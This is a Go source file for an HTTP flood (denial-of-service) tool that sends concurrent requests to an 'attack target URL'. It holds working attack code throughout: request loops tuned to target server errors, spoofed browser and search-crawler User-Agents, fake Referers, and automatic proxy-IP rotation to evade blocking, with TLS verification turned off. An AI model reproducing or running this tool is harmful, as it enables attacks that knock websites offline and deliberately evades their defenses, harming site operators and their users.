package main

import (
	"bytes"
	"crypto/tls"
	"errors"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/otokaze/go-kit/log"
	"github.com/urfave/cli/v2"
	"golang.org/x/time/rate"
)

var (
	proxyIP *IPInfo
	limit   = rate.NewLimiter(rate.Every(time.Minute), 1)
	choice  = []string{"Macintosh", "Windows", "X11"}
	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
	choice4 = []string{"Linux i686", "Linux x86_64"}
	choice5 = []string{"chrome", "spider", "ie"}
	choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
	spider  = []string{
		"AdsBot-Google ( http://www.google.com/adsbot.html)",
		"Baiduspider ( http://www.baidu.com/search/spider.htm)",
		"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
		"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
		"Googlebot-Image/1.0",
		"Googlebot-News",
		"Googlebot-Video/1.0",
	}
	referers = []string{
		"https://www.google.com/search?q=",
		"https://check-host.net/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.fbi.com/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"https://www.cia.gov/index.html",
		"https://vk.com/profile.php?auto=",
		"https://www.usatoday.com/search/results?q=",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
	}
	errs500, errs503, errsUnknow int32
)

func ddosAction(ctx *cli.Context) (err error) {
	if ctx.Args().First() == "" {
		err = errors.New("Attack target URL cannot be empty")
		return
	}
	var (
		wg   sync.WaitGroup
		body = bytes.NewBuffer([]byte(ctx.String("data")))
		n    = ctx.Int64("requests")
	)
	for c := ctx.Int("concurrency"); c > 0; c-- {
		wg.Add(1)
		go func() (err error) {
			defer wg.Done()
			for {
				if atomic.LoadInt64(&n) <= 0 {
					return
				}
				if atomic.LoadInt32(&errs500) >= 10 {
					time.Sleep(1 * time.Minute)
					resetErrs()
				} else if atomic.LoadInt32(&errs503) >= 100 {
					time.Sleep(500 * time.Microsecond)
					resetErrs()
				} else if atomic.LoadInt32(&errsUnknow) >= 1000 && proxyIP == nil {
					setProxyIP(ctx.String("pack"))
					resetErrs()
				}
				var req *http.Request
				if req, err = http.NewRequest(ctx.String("method"), ctx.Args().First(), body); err != nil {
					log.Error("http.NewRequest(%s, %s) error(%v)", ctx.String("method"), ctx.Args().First(), err)
					atomic.AddInt64(&n, -1)
					continue
				}
				for _, h := range ctx.StringSlice("header") {
					hs := strings.Split(h, ":")
					req.Header.Set(hs[0], strings.Join(hs[1:], ":"))
				}
				if req.Header.Get("User-Agent") == "" {
					req.Header.Set("User-Agent", getuseragent())
				}
				if req.Header.Get("Referer") == "" {
					req.Header.Set("Referer", referers[rand.Intn(len(referers))])
				}
				if req.Header.Get("Accept-Encoding") == "" {
					req.Header.Add("Accept-Encoding", "identity")
				}
				var resp *http.Response
				if resp, err = newHTTPCli().Do(req); err != nil {
					if atomic.LoadInt64(&n)%1000 == 0 {
						log.Error("ddosCli.Do(req) error(%v) requests(%d)", err, atomic.LoadInt64(&n))
					}
					atomic.AddInt32(&errsUnknow, 1)
					atomic.AddInt64(&n, -1)
					continue
				}
				resp.Body.Close()
				if resp.StatusCode != http.StatusOK {
					if atomic.LoadInt64(&n)%1000 == 0 {
						log.Error("resp.StatusCode(%d) not OK(200) requests(%d)", resp.StatusCode, atomic.LoadInt64(&n))
					}
					switch resp.StatusCode {
					case 500:
						atomic.AddInt32(&errs500, 1)
					case 503:
						atomic.AddInt32(&errs503, 1)
					default:
						atomic.AddInt32(&errsUnknow, 1)
					}
					atomic.AddInt64(&n, -1)
					continue
				}
				atomic.AddInt64(&n, -1)
				resetErrs()
			}
		}()
	}
	wg.Wait()
	return
}

func getuseragent() string {
	rand.Seed(time.Now().UnixNano())
	platform := choice[rand.Intn(len(choice))]
	var os string
	if platform == "Macintosh" {
		os = choice2[rand.Intn(len(choice2)-1)]
	} else if platform == "Windows" {
		os = choice3[rand.Intn(len(choice3)-1)]
	} else if platform == "X11" {
		os = choice4[rand.Intn(len(choice4)-1)]
	}
	browser := choice5[rand.Intn(len(choice5)-1)]
	if browser == "chrome" {
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		uwu := strconv.Itoa(rand.Intn(99)) + ".0" + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
		return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit
	} else if browser == "ie" {
		uwu := strconv.Itoa(rand.Intn(99)) + ".0"
		engine := strconv.Itoa(rand.Intn(99)) + ".0"
		option := rand.Intn(1)
		var token string
		if option == 1 {
			token = choice6[rand.Intn(len(choice6)-1)] + "; "
		} else {
			token = ""
		}
		return "Mozilla/5.0 (compatible; MSIE " + uwu + "; " + os + "; " + token + "Trident/" + engine + ")"
	}
	return spider[rand.Intn(len(spider))]
}

func resetErrs() {
	atomic.StoreInt32(&errs500, 0)
	atomic.StoreInt32(&errs503, 0)
	atomic.StoreInt32(&errsUnknow, 0)
}

func setProxyIP(pack string) (err error) {
	if !limit.Allow() {
		return
	}
	var ip *IPInfo
	if ip, err = GetProxyIP(pack); err != nil {
		return
	}
	proxyIP = ip
	go func(ip IPInfo) (err error) {
		var t time.Time
		if t, err = time.ParseInLocation("2006-01-02 15:04:05", ip.ExpireTime, time.Local); err != nil {
			log.Error("time.ParseInLocation(expireTime: %s) error(%v)", ip.ExpireTime, err)
			return
		}
		time.Sleep(time.Now().Sub(t))
		if ip.IP != proxyIP.IP {
			return
		}
		setProxyIP(pack)
		return
	}(*proxyIP)
	return
}

func newHTTPCli() *http.Client {
	var trans = &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		MaxIdleConnsPerHost: 10000,
		DisableCompression:  true,
		DisableKeepAlives:   true,
	}
	if proxyIP != nil {
		u, _ := url.Parse(fmt.Sprintf("http://%s:%d", proxyIP.IP, proxyIP.Port))
		trans.Proxy = http.ProxyURL(u)
	}
	return &http.Client{
		Timeout:   10 * time.Second,
		Transport: trans,
	}
}
